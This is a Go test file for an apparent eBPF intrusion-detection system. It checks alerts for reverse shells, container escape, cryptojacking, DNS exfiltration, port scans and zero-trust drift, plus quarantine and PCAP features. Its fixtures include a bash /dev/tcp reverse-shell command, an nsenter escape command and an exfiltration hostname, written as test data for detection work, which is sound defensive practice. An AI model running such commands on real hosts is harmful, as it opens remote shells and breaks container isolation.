package ebpf

import (
	"encoding/binary"
	"strings"
	"testing"
	"time"
)

func TestSecurityIDSDetections(t *testing.T) {
	ids := NewSecurityIDS()

	// 1. Reverse shell detection (T1059.004)
	revAlert := ids.InspectProcessCommand("worker-1", "web-app", "bash", "bash -i >& /dev/tcp/198.51.100.10/4444 0>&1", 1234, 0, false)
	if revAlert == nil || revAlert.Category != "reverse_shell" || revAlert.MitreTechnique != "T1059.004" {
		t.Fatalf("expected reverse_shell T1059.004 alert, got %+v", revAlert)
	}

	// 2. Container escape detection (T1611)
	escAlert := ids.InspectProcessCommand("worker-2", "api-svc", "nsenter", "nsenter --target 1 --mount --pid /bin/sh", 2345, 0, false)
	if escAlert == nil || escAlert.Category != "container_escape" || escAlert.MitreTechnique != "T1611" {
		t.Fatalf("expected container_escape T1611 alert, got %+v", escAlert)
	}

	// 3. Cryptojacking detection (T1496)
	cryptoFlow := Flow{
		SourceName: "compromised-worker",
		SourceIP:   "172.18.0.10",
		DestName:   "pool.minexmr.invalid",
		DestIP:     "203.0.113.5",
		DestPort:   3333,
		Protocol:   "TCP",
		Timestamp:  time.Now(),
	}
	alerts := ids.AnalyzeFlow(&cryptoFlow)
	if len(alerts) == 0 || alerts[0].Category != "cryptojacking" {
		t.Fatalf("expected cryptojacking alert, got %+v", alerts)
	}

	// 4. DNS Tunneling / Exfiltration detection (T1071.004)
	dnsFlow := Flow{
		SourceName: "db-backup",
		SourceIP:   "172.18.0.11",
		DestName:   "gbnt-coredns",
		DestIP:     "172.18.0.3",
		DestPort:   53,
		Protocol:   "DNS",
		Path:       "9a8f7c6b5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a.exfil.evil.invalid",
		Timestamp:  time.Now(),
	}
	dnsAlerts := ids.AnalyzeFlow(&dnsFlow)
	if len(dnsAlerts) == 0 || dnsAlerts[0].Category != "dns_exfiltration" {
		t.Fatalf("expected dns_exfiltration alert, got %+v", dnsAlerts)
	}

	// 5. Internal Port Scan Sweep (T1046)
	var scanTriggered bool
	for _, p := range []int{21, 22, 80, 443, 3306, 5432, 6379} {
		sf := Flow{
			SourceName: "scanner-pod",
			SourceIP:   "172.18.0.55",
			DestName:   "target-host",
			DestIP:     "172.18.0.60",
			DestPort:   p,
			Protocol:   "TCP",
			Timestamp:  time.Now(),
		}
		for _, a := range ids.AnalyzeFlow(&sf) {
			if a.Category == "port_scan" {
				scanTriggered = true
			}
		}
	}
	if !scanTriggered {
		t.Fatalf("expected port_scan alert after 7 distinct ports")
	}

	// 6. Zero-Trust baseline lock & drift detection
	ids.SetBaselineLocked(true, true)
	driftFlow := Flow{
		SourceName: "new-rogue-svc",
		DestName:   "vault-svc",
		DestPort:   8200,
		Protocol:   "HTTP",
		Timestamp:  time.Now(),
	}
	driftAlerts := ids.AnalyzeFlow(&driftFlow)
	foundDrift := false
	for _, a := range driftAlerts {
		if a.Category == "zero_trust_drift" {
			foundDrift = true
		}
	}
	if !foundDrift {
		t.Fatalf("expected zero_trust_drift alert when baseline is locked")
	}
	zt := ids.GetZeroTrustBaseline()
	if !zt.Locked || zt.DriftCount < 1 || !strings.Contains(zt.NftablesPolicy, "table inet gbnt_zerotrust") {
		t.Fatalf("unexpected zero-trust baseline state: locked=%v drift=%d", zt.Locked, zt.DriftCount)
	}
}

func TestAttackSurfaceClassifier(t *testing.T) {
	declared := map[int]bool{8080: true}

	dockerExposed := classifyAttackSurface("worker-1", "10.0.0.2", "TCP", "0.0.0.0", 2375, "dockerd", 999, "", declared)
	if dockerExposed.RiskLevel != "critical" || !dockerExposed.IsShadow {
		t.Fatalf("expected critical shadow risk for 0.0.0.0:2375, got %+v", dockerExposed)
	}

	dbExposed := classifyAttackSurface("worker-1", "10.0.0.2", "TCP", "0.0.0.0", 5432, "postgres", 1010, "pg", declared)
	if dbExposed.RiskLevel != "critical" {
		t.Fatalf("expected critical risk for exposed postgres on 0.0.0.0, got %+v", dbExposed)
	}

	declaredApp := classifyAttackSurface("worker-1", "10.0.0.2", "TCP", "127.0.0.1", 8080, "app", 1020, "app", declared)
	if declaredApp.RiskLevel != "low" || declaredApp.IsShadow {
		t.Fatalf("expected low risk non-shadow for declared 127.0.0.1:8080, got %+v", declaredApp)
	}
}

func TestForensicsQuarantinePCAPAndPurpleTeam(t *testing.T) {
	probe := NewProbe()
	ids := NewSecurityIDS()
	fm := NewForensicsManager()
	probe.SetSubsystems(ids, fm, nil)

	// 1. Purple Team scenarios
	scenarios := fm.GetPurpleTeamScenarios()
	if len(scenarios) < 6 {
		t.Fatalf("expected at least 6 purple team scenarios, got %d", len(scenarios))
	}
	for _, sc := range scenarios {
		run, err := fm.RunPurpleTeamScenario(PurpleTeamRunRequest{
			ScenarioID:      sc.ID,
			TargetNode:      "manager",
			TargetContainer: "gbnt-caddy",
		}, probe, ids, "tester")
		if err != nil {
			t.Fatalf("purple team scenario %s failed: %v", sc.ID, err)
		}
		if !run.Detected || run.Score < 60 {
			t.Fatalf("expected scenario %s to be detected with score >= 60, got detected=%v score=%d", sc.ID, run.Detected, run.Score)
		}
	}

	// 2. Forensic Quarantine & Release
	q := fm.QuarantineContainer(QuarantineRequest{
		ContainerName: "suspect-container",
		NodeHost:      "manager",
		Reason:        "Unit test DFIR isolation",
	}, "tester", ids)
	if q.Status != "active" || !fm.IsContainerQuarantined("suspect-container") {
		t.Fatalf("expected active quarantine, got %+v", q)
	}
	rel, ok := fm.ReleaseQuarantine(q.ID, "tester")
	if !ok || rel.Status != "released" || fm.IsContainerQuarantined("suspect-container") {
		t.Fatalf("expected released quarantine, got ok=%v rec=%+v", ok, rel)
	}

	// 3. Valid PCAP binary synthesis
	pcap := fm.CapturePCAP(PCAPCaptureRequest{
		NodeHost:      "manager",
		ContainerName: "gbnt-caddy",
		DurationS:     1,
	}, probe, "tester")
	raw, _, ok := fm.GetPCAPData(pcap.ID)
	if !ok || len(raw) < 24 {
		t.Fatalf("expected valid pcap bytes >= 24, got ok=%v len=%d", ok, len(raw))
	}
	magic := binary.LittleEndian.Uint32(raw[0:4])
	if magic != 0xa1b2c3d4 {
		t.Fatalf("expected libpcap magic 0xa1b2c3d4, got 0x%x", magic)
	}
}
